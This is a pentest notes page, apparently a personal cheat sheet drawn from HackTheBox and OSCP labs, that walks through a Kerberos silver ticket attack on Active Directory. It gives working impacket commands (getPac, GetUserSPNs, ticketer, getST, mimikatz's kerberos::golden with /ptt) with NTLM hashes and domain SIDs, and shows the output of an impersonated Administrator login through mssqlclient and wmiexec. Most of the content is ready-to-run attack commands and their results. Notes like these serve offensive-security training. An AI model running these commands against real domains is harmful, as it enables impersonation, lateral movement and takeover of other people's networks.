---
description: >-
  Silver Ticket Attack
title: Silver Ticket Attack              # Add title here
date: 2023-01-22 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Lateral Movement]             # Change Templates to Writeup
tags: [active directory, lateral movement, silver ticket]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Ticketer
To generate a Silver ticket we need 3 resources:
- NTLM Hash 
- DC SID
- SPN

### Getting NTLM Hash
> To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.
{: .prompt-danger }

If we don't have the NTLM Hash but we have the password we can generate the hash with this tool: [NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator)
![Getting-NTLM-Hash](/assets/img/Pasted image 20230122000844.png)

### Extracting DC SID
To create the ticket, we first need the obtain the so-called _Security Identifier_ or _SID_ of the domain. A SID is an unique name for any object in Active Directory and has the following structure:
```text
S-1-5-21-2536614405-3629634762-1218571035-1116
```
Within this structure, the SID begins with a literal "S" to identify the string as a SID, followed by a _revision level_ (usually set to "1"), an _identifier-authority_ value (often "5" within AD) and one or more _subauthority_ values.

We can use the following command:
```bash
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
```
Also if we compromised a machine already we can easily obtain the SID of our current user with the whoami /user command and then extract the domain SID part from it. Let's try to do this on our Windows 10 client:
```powershell
C:\>whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
```

### Getting the SPN
(-k option is needed only if NTLM authentication is disabled)
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
```

### Generating the Silver Ticket:
#### impacket-ticketer
We can craft a ticket as follows:
```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local Administrator -domain scrm.local
```
Examples:
[Intelligence](https://shuciran.github.io/posts/Outdated/#fnref:silver-ticket)
#### impacket-getST
Another option is to craft it with this impacket tool:
```bash
sudo impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :fca9edf1c9fb8f031dfc38d918279642
```
Examples:
[Intelligence](https://shuciran.github.io/posts/Outdated/#fnref:silver-ticket-impacket-getst)

### Using ticket with any impacket utility
#### impacket-mssqlclient
We can export the Administrator.ccache file generated so we can use it with any impacket utility:
```bash
export KRB5CCNAME=Administrator.ccache
```
As shown below:
```bash
impacket-mssqlclient dc1.scrm.local -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```
Examples:
[[Scramble#^ac1e1e]]

#### impacket-wmiexec
Then we can execute the `impacket-wmiexec` to access the machine:
```bash
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass dc.intelligence.htb
C:\>whoami
intelligence\administrator
```

Resources:
[SilverTicket Explanation S4vitar Minuto 1:20:00](https://www.youtube.com/watch?v=osmFGqnFe8c&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29):
![Silver-Ticket-Attack](/assets/img/Pasted image 20230122223446.png)

### Mimikatz
An additional option is to load the silver ticket to memory with mimikatz as follows:
```bash
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::list

mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
User      : offsec
Domain    : corp.com (CORP)
SID       : S-1-5-21-1602875587-2787523311-2599479668
User Id   : 500
Groups Id : \*513 512 520 518 519
ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt
Service   : HTTP
Target    : CorpWebServer.corp.com
Lifetime  : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
-> Ticket : \*\* Pass The Ticket \*\*

 \* PAC generated
 \* PAC signed
 \* EncTicketPart generated
 \* EncTicketPart encrypted
 \* KrbCred generated

Golden ticket for 'offsec @ corp.com' successfully submitted for current session

mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com
   Client Name       : offsec @ corp.com
   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
```

Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket. Depending on the type of service, it might also be possible to obtain code execution.